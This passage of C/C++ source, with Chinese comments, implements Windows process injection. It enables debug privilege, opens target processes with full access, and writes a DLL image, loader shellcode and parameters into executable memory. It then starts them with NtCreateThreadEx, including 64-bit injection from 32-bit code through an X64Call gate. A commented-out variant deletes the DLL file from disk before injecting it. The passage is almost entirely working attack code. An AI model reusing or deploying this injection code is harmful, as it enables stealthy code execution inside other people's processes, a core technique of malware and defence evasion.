	WriteProcessMemory64(hProcess, pAddress + dataSize + fileSize2, &param, sizeof(PARAMX64), &dWrited);//参数写入到目标

	DWORD64 NtCreateThreadEx64 = GetProcAddress64(getNTDLL64(), "NtCreateThreadEx");
	HANDLE hThread;
	DWORD64 A = X64Call(NtCreateThreadEx64, 11, (DWORD64)&hThread, (DWORD64)THREAD_ALL_ACCESS, (DWORD64)NULL, (DWORD64)hProcess, (DWORD64)(pAddress + dataSize), (DWORD64)(pAddress + dataSize + fileSize2), (DWORD64)0, (DWORD64)0, (DWORD64)0, (DWORD64)0, (DWORD64)0);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return TRUE;


}
void LoadRemoteData32by32(LPVOID data, DWORD dataSize, DWORD processId)
{
	SIZE_T dWrited = 0;
	HMODULE ntdll = NULL;
	if (!processId)return;
	ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll)return;
	DWORD RSize = 0;
	

	DWORD fileSize2 = sizeof(shellcodex32);
	VOID *pBuffer2 = shellcodex32;
	PARAMX param;
	RtlZeroMemory(&param, sizeof(PARAMX));
	param.DataLength = dataSize;
	param.LdrGetProcedureAddress = (LdrGetProcedureAddressT)GetProcAddress(ntdll, "LdrGetProcedureAddress");
	param.dwNtAllocateVirtualMemory = (NtAllocateVirtualMemoryT)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	param.pLdrLoadDll = (LdrLoadDllT)GetProcAddress(ntdll, "LdrLoadDll");
	param.RtlInitAnsiString = (RtlInitAnsiStringT)GetProcAddress(ntdll, "RtlInitAnsiString");
	param.RtlAnsiStringToUnicodeString = (RtlAnsiStringToUnicodeStringT)GetProcAddress(ntdll, "RtlAnsiStringToUnicodeString");
	param.RtlFreeUnicodeString = (RtlFreeUnicodeStringT)GetProcAddress(ntdll, "RtlFreeUnicodeString");


	//开始远程注入
	EnableDebugPrivilege();

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processId);
	if (hProcess == NULL)
	{
		return;
	}
	//申请内存,把shellcode和DLL数据,和参数复制到目标进程
	DWORD pAddress = (DWORD)VirtualAllocEx(hProcess, 0, dataSize + fileSize2 + sizeof(PARAMX) + 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddress)
	{
		CloseHandle(hProcess);
		return;
	}

	param.lpFileData = (PVOID)pAddress;//修成下DLL数据的地址

	WriteProcessMemory(hProcess, (LPVOID)pAddress, data, dataSize, &dWrited);//DLL数据写入到目标
	WriteProcessMemory(hProcess, (LPVOID)(pAddress + dataSize), pBuffer2, fileSize2, &dWrited);//shellcode写入到目标
	WriteProcessMemory(hProcess, (LPVOID)(pAddress + dataSize + fileSize2), &param, sizeof(PARAMX), &dWrited);//参数写入到目标
	_NtCreateThreadEx NtCreateThreadEx64 = (_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
	if (NtCreateThreadEx64 == NULL)return;
	HANDLE hThread = NULL;
	NtCreateThreadEx64(&hThread, (DWORD)THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)(pAddress + dataSize), (LPVOID)(pAddress + dataSize + fileSize2), 0, 0, 0, 0, 0);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return;

}

void LoadRemotedata32by32Ex(LPVOID data, DWORD dataSize, HANDLE hProcess)
{
	SIZE_T dWrited = 0;
	HMODULE ntdll = NULL;
	ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll)return;
	DWORD RSize = 0;


	DWORD fileSize2 = sizeof(shellcodex32);
	VOID *pBuffer2 = shellcodex32;
	PARAMX param;
	RtlZeroMemory(&param, sizeof(PARAMX));
	param.DataLength = dataSize;
	param.LdrGetProcedureAddress = (LdrGetProcedureAddressT)GetProcAddress(ntdll, "LdrGetProcedureAddress");
	param.dwNtAllocateVirtualMemory = (NtAllocateVirtualMemoryT)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	param.pLdrLoadDll = (LdrLoadDllT)GetProcAddress(ntdll, "LdrLoadDll");
	param.RtlInitAnsiString = (RtlInitAnsiStringT)GetProcAddress(ntdll, "RtlInitAnsiString");
	param.RtlAnsiStringToUnicodeString = (RtlAnsiStringToUnicodeStringT)GetProcAddress(ntdll, "RtlAnsiStringToUnicodeString");
	param.RtlFreeUnicodeString = (RtlFreeUnicodeStringT)GetProcAddress(ntdll, "RtlFreeUnicodeString");

	if (hProcess == NULL)
	{
		return;
	}
	//申请内存,把shellcode和DLL数据,和参数复制到目标进程
	DWORD pAddress = (DWORD)VirtualAllocEx(hProcess, 0, dataSize + fileSize2 + sizeof(PARAMX) + 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddress)
	{
		return;
	}

	param.lpFileData = (PVOID)pAddress;//修成下DLL数据的地址

	WriteProcessMemory(hProcess, (LPVOID)pAddress, data, dataSize, &dWrited);//DLL数据写入到目标
	WriteProcessMemory(hProcess, (LPVOID)(pAddress + dataSize), pBuffer2, fileSize2, &dWrited);//shellcode写入到目标
	WriteProcessMemory(hProcess, (LPVOID)(pAddress + dataSize + fileSize2), &param, sizeof(PARAMX), &dWrited);//参数写入到目标
	_NtCreateThreadEx NtCreateThreadEx64 = (_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
	if (NtCreateThreadEx64 == NULL)return;
	HANDLE hThread = NULL;
	NtCreateThreadEx64(&hThread, (DWORD)THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)(pAddress + dataSize), (LPVOID)(pAddress + dataSize + fileSize2), 0, 0, 0, 0, 0);
	CloseHandle(hThread);
	return;

}

BOOL LoadLocalData32By64(LPVOID data, DWORD dataSize)
{
	SIZE_T dWrited = 0;
	DWORD RSize = 0;
	DWORD fileSize2 = sizeof(shellcodex64);
	VOID *pBuffer2 = shellcodex64;
	PARAMX64 param;
	RtlZeroMemory(&param, sizeof(PARAMX64));
	param.DataLength = dataSize;
	param.LdrGetProcedureAddress = getLdrGetProcedureAddress();
	param.dwNtAllocateVirtualMemory = GetProcAddress64(getNTDLL64(), "NtAllocateVirtualMemory");
	param.pLdrLoadDll = GetProcAddress64(getNTDLL64(), "LdrLoadDll");
	param.RtlInitAnsiString = GetProcAddress64(getNTDLL64(), "RtlInitAnsiString");
	param.RtlAnsiStringToUnicodeString = GetProcAddress64(getNTDLL64(), "RtlAnsiStringToUnicodeString");
	param.RtlFreeUnicodeString = GetProcAddress64(getNTDLL64(), "RtlFreeUnicodeString");


	HANDLE hProcess = GetCurrentProcess();

	//申请内存,把shellcode和DLL数据,和参数复制到目标进程
	DWORD64 pAddress = VirtualAllocEx64(hProcess, 0, dataSize + fileSize2 + sizeof(PARAMX64) + 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pAddress)
	{
		return FALSE;
	}

	param.lpFileData = (DWORD64)pAddress;//修成下DLL数据的地址

	WriteProcessMemory64(hProcess, pAddress, data, dataSize, &dWrited);//DLL数据写入到目标
	WriteProcessMemory64(hProcess, pAddress + dataSize, pBuffer2, fileSize2, &dWrited);//shellcode写入到目标
	WriteProcessMemory64(hProcess, pAddress + dataSize + fileSize2, &param, sizeof(PARAMX64), &dWrited);//参数写入到目标
	X64Call((DWORD64)(pAddress + dataSize), 1, (DWORD64)(pAddress + dataSize + fileSize2));
	//DWORD64 NtCreateThreadEx64 = GetProcAddress64(getNTDLL64(), "NtCreateThreadEx");
	//DWORD64 hThread;
	//DWORD64 AA = X64Call(NtCreateThreadEx64, 11, &hThread, (DWORD64)THREAD_ALL_ACCESS, (DWORD64)NULL, (DWORD64)hProcess, (DWORD64)(pAddress + dataSize), (DWORD64)(pAddress + dataSize + fileSize2), (DWORD64)0, (DWORD64)0, (DWORD64)0, (DWORD64)0, (DWORD64)0);
	return TRUE;
}

#endif

//void SaveShellCode()
//{
//	DWORD ssss = 0;
//	HANDLE hFile = CreateFile("c:\\1.CODE", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
//	if (hFile)
//	{
//		WriteFile(hFile, MemLoadLibrary2, 2502, &ssss, NULL);
//		CloseHandle(hFile);
//	}
//}

//void LoadRemotedllX64ByX64(LPSTR dllName, LPSTR Processname)
//{
//	SIZE_T dWrited = 0;
//	DWORD processId = GetProcessId(Processname);
//	if (!processId)return;
//	HANDLE hFile = CreateFile(dllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
//	if (hFile != INVALID_HANDLE_VALUE)
//	{
//		//获取DLL数据
//		DWORD fileSize = GetFileSize(hFile, NULL);
//		DWORD RSize = 0;
//		VOID *pBuffer = malloc(fileSize);
//		ReadFile(hFile, pBuffer, fileSize, &RSize, NULL);
//		CloseHandle(hFile);
//		DeleteFile(dllName);
//		//获取shellcode
//		DWORD fileSize2 = sizeof(shellcodex64);
//
//		VOID *pBuffer2 = shellcodex64;
//		PARAMX64 param;
//		RtlZeroMemory(&param, sizeof(PARAMX64));
//		param.DataLength = fileSize;
//		param.LdrGetProcedureAddress = getLdrGetProcedureAddress();
//		param.dwNtAllocateVirtualMemory = GetProcAddress64(getNTDLL64(), "NtAllocateVirtualMemory");
//		param.pLdrLoadDll = GetProcAddress64(getNTDLL64(), "LdrLoadDll");
//		param.RtlInitAnsiString = GetProcAddress64(getNTDLL64(), "RtlInitAnsiString");
//		param.RtlAnsiStringToUnicodeString = GetProcAddress64(getNTDLL64(), "RtlAnsiStringToUnicodeString");
//		param.RtlFreeUnicodeString = GetProcAddress64(getNTDLL64(), "RtlFreeUnicodeString");
//
//
//		//开始远程注入
//		EnableDebugPrivilege();
//
//		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processId);
//		int a = GetLastError();
//		if (hProcess == NULL)
//		{
//			free(pBuffer);
//			return;
//		}
//		//申请内存,把shellcode和DLL数据,和参数复制到目标进程
//		DWORD64 pAddress = VirtualAllocEx64(hProcess, 0, fileSize + fileSize2 + sizeof(PARAMX64) + 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//		if (!pAddress)
//		{
//			free(pBuffer);
//			CloseHandle(hProcess);
//			return;
//		}
//
//		param.lpFileData = pAddress;//修成下DLL数据的地址
//
//		WriteProcessMemory64(hProcess, pAddress, pBuffer, fileSize, &dWrited);//DLL数据写入到目标
//		WriteProcessMemory64(hProcess, pAddress + fileSize, pBuffer2, fileSize2, &dWrited);//shellcode写入到目标
//		WriteProcessMemory64(hProcess, pAddress + fileSize + fileSize2, &param, sizeof(PARAMX64), &dWrited);//参数写入到目标
//
//		free(pBuffer);
//		DWORD64 NtCreateThreadEx64 = GetProcAddress64(getNTDLL64(), "NtCreateThreadEx");
//		HANDLE hThread;
//		X64Call(NtCreateThreadEx64, 11, (DWORD64)&hThread, (DWORD64)THREAD_ALL_ACCESS, (DWORD64)NULL, (DWORD64)hProcess, (DWORD64)(pAddress + fileSize), (DWORD64)(pAddress + fileSize + fileSize2), (DWORD64)0, (DWORD64)0, (DWORD64)0, (DWORD64)0, (DWORD64)0);
//		return;
//	}
//}